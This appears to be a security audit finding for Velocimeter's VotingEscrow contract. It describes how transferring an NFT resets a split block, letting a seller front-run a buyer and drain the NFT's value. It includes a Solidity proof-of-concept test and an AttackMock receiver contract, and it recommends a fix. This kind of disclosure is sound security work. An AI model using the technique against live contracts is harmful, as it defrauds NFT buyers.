Broad Cherry Viper

High

# A malicious user can reduce the value of an NFT before selling it

## Summary

A malicious user can front-run transactions to reduce the value of an NFT, causing the buyer to lose all their funds.

## Vulnerability Detail

When `blockedSplit` is set to true, it is intended to prevent the sale of an NFT by reducing its value through the `split` function. However, calling `safeTransferFrom` or `transferFrom` is not affected by this and will reset `blockedSplit` to false after execution.

A malicious user can exploit this by using `safeTransferFrom` or `transferFrom` to set `blockedSplit` to false and immediately send the NFT back to the user. Then, they can call `split` right away, causing the NFT's value to be lower than its actual worth when other users attempt to purchase it.

Consider the following scenario:
1. User A wants to sell NFT A (worth $100) and creates two contracts (A and B). Contract A fully supports the functionalities of `votingEscrow` and the target `nft marketplace`, and combines the calls to `safeTransferFrom` and `split` into a single function. Contract B, upon receiving the NFT, will transfer it back via `onERC721Received`.

2. User A lists NFT A for sale in the `marketplace` through contract A.

3. User B wants to buy NFT A and initiates the `buy` transaction.

4. User A detects User B's attempt to purchase NFT A and, through a front-running transaction, sends NFT A from contract A to contract B. Contract B, upon receiving the NFT, sends it back, resetting `blockedSplit` to false. Then, User A calls `split`, reducing the NFT's value to $0.1.

5. Finally, User B ends up purchasing an NFT worth $0.1, losing a significant amount of money.



<details>

<summary>Coded Poc</summary>

### VotingEscrow.t.sol

bypass block_split check

```solidity
    function testHackSplitBlock() public {
        flowDaiPair.approve(address(escrow), 10*TOKEN_1);
        uint256 lockDuration = 7 * 24 * 3600; // 1 week
        escrow.create_lock(10*TOKEN_1, lockDuration);

        uint[] memory amounts = new uint[](2);
        amounts[0] = 3*TOKEN_1;
        amounts[1] = 7*TOKEN_1;

        int amount;
        uint duration;
        (amount, duration) = escrow.locked(1);

        escrow.block_split(1);

        vm.expectRevert("split blocked");
        escrow.split(1,amounts[1]);

        // escrow.transferFrom(address(owner),address(owner2),1);
        AttackMock attacker = new AttackMock(address(escrow));
        console.log("before token id: %d, owner:%d", 1, uint160(escrow.ownerOf(1)));
        escrow.safeTransferFrom(address(owner), address(attacker), 1);
        console.log("after token id: %d, owner:%d", 1, uint160(escrow.ownerOf(1)));

        escrow.split(1,amounts[1]);
        (amount, duration) = escrow.locked(1);
        assertEq(amount, 3e18);
        assertEq(duration, lockDuration);
    }
```



### AttackMock.sol

```solidity
pragma solidity 0.8.13;

import "solmate/test/utils/mocks/MockERC20.sol";
import "contracts/Gauge.sol";
import "contracts/Minter.sol";
import "contracts/Pair.sol";
import "contracts/factories/PairFactory.sol";
import "contracts/Router.sol";
import "contracts/Flow.sol";
import "contracts/VotingEscrow.sol";
import "utils/TestStakingRewards.sol";
import "utils/TestVotingEscrow.sol";
import {IERC721Receiver} from "openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
import "../contracts/interfaces/IVotingEscrow.sol";

contract AttackMock is IERC721Receiver {
    IVotingEscrow escrow;
    constructor(address _escrow) {
        escrow = IVotingEscrow(_escrow);
    }

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes memory _data
    ) public returns(bytes4) {
        escrow.transferFrom(address(this),address(_operator), _tokenId);
        return this.onERC721Received.selector;
    }

    fallback () external payable {}
    receive() external payable {}
}

```

</details>

## Impact

In the NFT marketplace, users purchasing NFTs will lose nearly all their money.

## Code Snippet

https://github.com/sherlock-audit/2024-06-velocimeter/blob/63818925987a5115a80eff4bd12578146a844cfd/v4-contracts/contracts/VotingEscrow.sol#L315-L342

## Tool used

Manual Review

## Recommendation

Add a check for `ownership_change` in `_transferFrom` to prevent multiple NFT transfers within the same block.